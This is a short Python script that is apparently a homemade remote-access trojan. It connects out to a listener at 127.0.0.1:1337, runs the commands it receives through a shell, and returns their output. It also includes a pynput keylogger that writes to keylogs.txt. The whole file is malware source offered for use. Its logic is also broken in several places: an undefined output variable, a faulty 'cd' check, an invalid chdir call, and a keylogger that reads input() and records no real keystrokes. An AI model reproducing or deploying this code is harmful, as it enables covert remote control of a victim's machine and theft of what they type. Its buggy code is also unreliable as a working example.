import socket
import os
import subprocess
import getpass
from pynput import keyboard
import time


def ter2serv():
    ip = "127.0.0.1"
    port = 1337
    term = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    term.connect((ip, port))
    term.send(b'Hi if you want terminal press "t"\n')
    term.send(b'Hi if you want logger press "l"\n')
    time.sleep(5)
    while True:
        prompt = f'{getpass.getuser()}@{socket.gethostname()}:{os.path.expanduser("~")}/ '
        term.send(prompt.encode())
        command = term.recv(4056)
        if command.decode("utf-8") == "t":
            command_out = comm_run(command)
        elif command.decode("utf-8") == "l":
            key = str(input())
            on_press(key)    
            if command_out is not None:
                term.send(command_out.encode())
            
         
        
def comm_run(command):
    if "cd" in command.decode("utf-8"):
        try:
            os.chdir(command[3::])
            return " "       
        except FileNotFoundError as Err:
            print(Err) 
            return
    elif "cd .." in command.decode("utf-8"):
        try:
            os.chdir('-')
            return " "       
        except FileNotFoundError as Err:
            print(Err) 
            return     
    serv_comm = subprocess.run(command, shell=True, capture_output=True)
    if serv_comm.stdout.decode("utf-8").strip("\n"):
        print(serv_comm.stdout.decode("utf-8").strip("\n"))
        output_file(serv_comm)
        return serv_comm.stdout.decode("utf-8").strip("\n")
    elif serv_comm.stderr.decode("utf-8").strip("\n"):
        print(serv_comm.stderr.decode("utf-8").strip("\n"))
        output_file(serv_comm)
        return serv_comm.stderr.decode("utf-8").strip("\n")

def output_file(serv_comm):
    output = print(serv_comm.stdout.decode("utf-8").strip("\n"))
    str_output = str(output)
    with open("output.txt", "w") as file:
        file.write(str_output)
    err_output = print(serv_comm.stderr.decode("utf-8").strip("\n"))    
    str_err_output = str(err_output)
    with open("err_output.txt", "w") as file:
        file.write(str_err_output)
        
def on_press(key):
    
    key = str(input())
    with open('keylogs.txt', 'a') as logs:
            logs.write(str(key))
    listener = keyboard.Listener(on_press=on_press)
    listener.start()        

def main():
    try:
        command = ter2serv()                        
        comm_run(command)        
    except KeyboardInterrupt:
        print("see you soon..")         
main()    